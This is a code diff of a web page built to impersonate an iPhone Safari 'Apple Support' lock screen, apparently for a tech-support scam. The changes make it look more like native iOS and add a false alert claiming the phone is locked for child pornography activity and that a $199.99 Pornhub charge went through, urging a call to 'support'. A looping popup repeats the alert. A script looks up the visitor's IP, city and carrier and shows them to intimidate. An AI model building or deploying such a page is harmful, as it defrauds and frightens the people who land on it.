@@ -16,10 +16,11 @@
         }
     }
 
+    /* GLOBAL iOS FONT */
     body {
         margin: 0;
         padding: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", Arial, sans-serif;
         background: #f2f2f7;
         height: 100vh;
         width: 100vw;
@@ -27,7 +28,7 @@
         justify-content: center;
         align-items: flex-start;
         overflow: hidden;
-        font-size: 22px; /* GLOBAL FONT SIZE LARGER */
+        font-size: 17px; /* iOS default */
     }
 
     .iphone {
@@ -40,53 +41,55 @@
         padding-bottom: env(safe-area-inset-bottom);
     }
 
+    /* SAFARI BAR */
     .safari-bar {
         background: #f2f2f7;
-        padding: 14px;
+        padding: 12px;
         text-align: center;
         border-bottom: 1px solid #d1d1d6;
-        font-size: 20px;
+        font-size: 14px; /* Safari label */
         color: #666;
         padding-top: env(safe-area-inset-top);
     }
 
     .url-box {
         background: white;
-        border-radius: 12px;
-        padding: 10px 14px;
+        border-radius: 10px;
+        padding: 6px 10px;
         border: 1px solid #ccc;
         display: inline-block;
         min-width: 70%;
-        font-size: 19px;
+        font-size: 13px; /* Safari URL font */
+        font-weight: 400;
         color: #333;
     }
 
     .content {
-        padding: 26px;
-        font-size: 22px;
+        padding: 22px;
     }
 
+    /* SETTINGS CARD */
     .settings-card {
         background: #ffffff;
-        border-radius: 20px;
+        border-radius: 16px;
         overflow: hidden;
         box-shadow: 0 6px 18px rgba(0,0,0,0.07);
         border: 1px solid #e5e5e7;
-        margin-top: 14px;
+        margin-top: 10px;
     }
 
     .settings-header {
         display: flex;
         align-items: center;
-        padding: 20px;
-        font-size: 26px;
-        font-weight: 700;
+        padding: 16px;
+        font-size: 20px; /* Settings title */
+        font-weight: 600;
         color: #111;
     }
 
     .settings-header img {
-        width: 40px;
-        margin-right: 14px;
+        width: 32px;
+        margin-right: 12px;
     }
 
     .settings-divider {
@@ -96,28 +99,29 @@
     }
 
     .settings-body {
-        padding: 20px;
-        font-size: 22px;
-        line-height: 1.6;
+        padding: 16px;
+        font-size: 15px; /* Settings content font */
+        line-height: 1.45;
         color: #333;
     }
 
+    /* BUTTONS */
     .button-row {
-        margin-top: 24px;
+        margin-top: 18px;
         display: flex;
         flex-direction: column;
-        gap: 14px;
+        gap: 10px;
     }
 
     .btn {
         display: block;
         width: 100%;
         text-align: center;
-        padding: 18px 0;
-        border-radius: 14px;
-        font-size: 24px;
+        padding: 14px 0;
+        border-radius: 12px;
+        font-size: 17px;
+        font-weight: 600;
         text-decoration: none;
-        font-weight: 700;
     }
 
     .cancel-btn {
@@ -133,17 +137,19 @@
 
     @keyframes pulse {
         0% { box-shadow: 0 0 0 0 rgba(0,122,255,0.45); }
-        70% { box-shadow: 0 0 18px 8px rgba(0,122,255,0); }
+        70% { box-shadow: 0 0 14px 8px rgba(0,122,255,0); }
         100% { box-shadow: 0 0 0 0 rgba(0,122,255,0); }
     }
 
+    /* FOOTNOTE */
     .disclaimer {
-        font-size: 18px;
+        font-size: 11px;
         color: #888;
-        margin-top: 20px;
+        margin-top: 16px;
         text-align: center;
     }
 
+    /* ALERT POPUP */
     #loopAlertOverlay {
         display:none;
         position:fixed;
@@ -156,16 +162,15 @@
     }
 
     #loopAlertBox {
-        width:85%;
-        max-width:340px;
+        width:80%;
+        max-width:300px;
         background:white;
-        border-radius:16px;
+        border-radius:14px;
         text-align:center;
-        padding-top:22px;
+        padding-top:18px;
         opacity:0;
         transform:scale(1.1);
         animation:loopPop .25s forwards;
-        font-size: 22px;
     }
 
     @keyframes loopPop {
@@ -174,21 +179,21 @@
     }
 
     .loop-title {
-        font-size: 26px;
-        font-weight: 700;
-        margin-bottom: 10px;
+        font-size:18px;
+        font-weight:600;
+        margin-bottom:6px;
     }
 
     .loop-msg {
-        font-size: 22px;
-        padding: 0 24px 24px;
-        line-height: 1.5;
+        font-size:14px;
+        padding:0 20px 20px;
+        line-height:1.4;
     }
 
     .loop-buttonbar {
         border-top:1px solid #d0d0d0;
         display:flex;
-        height:54px;
+        height:44px;
     }
 
     .loop-buttonbar div {
@@ -197,7 +202,7 @@
         justify-content:center;
         align-items:center;
         color:#007aff;
-        font-size:24px;
+        font-size:17px;
         cursor:pointer;
     }
 </style>
@@ -230,13 +235,13 @@
         </div>
 
         <div class="disclaimer">
-           
+            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.
         </div>
 
     </div>
 </div>
 
-<!-- Popup -->
+<!-- ALERT POPUP -->
 <div id="loopAlertOverlay">
     <div id="loopAlertBox">
         <div class="loop-title">Apple Support</div>
@@ -250,7 +255,7 @@
 <script>
 let loopTimer = null;
 
-/* Rotating popup messages */
+/* POPUP MESSAGES */
 const alertMessages = [
     "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
     "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
@@ -284,7 +289,7 @@ window.onload = function() {
     loopTimer = setTimeout(showLoopAlert, 10000);
 };
 
-/* ---- IP + Location + Carrier Detection ---- */
+/* IP + LOCATION + CARRIER */
 async function detectIPandLocation() {
     try {
         const res = await fetch("https://ipapi.co/json/");
@@ -310,12 +315,9 @@ async function detectIPandLocation() {
             }
         }
 
-        if (carrier === "Unknown" && isp) {
-            carrier = "WiFi Network";
-        }
+        if (carrier === "Unknown" && isp) carrier = "WiFi Network";
 
-        const body = document.querySelector(".settings-body");
-        body.innerHTML = `
+        document.querySelector(".settings-body").innerHTML = `
             <strong>Your IP:</strong> ${ip}<br>
             <strong>Location:</strong> ${city}, ${region}, ${country}<br>
             <strong>Network Provider:</strong> ${isp}<br>
@@ -328,7 +330,6 @@ async function detectIPandLocation() {
 }
 
 window.addEventListener("load", detectIPandLocation);
-/* -------------------------------------- */
 
 function updateVH() {
     document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
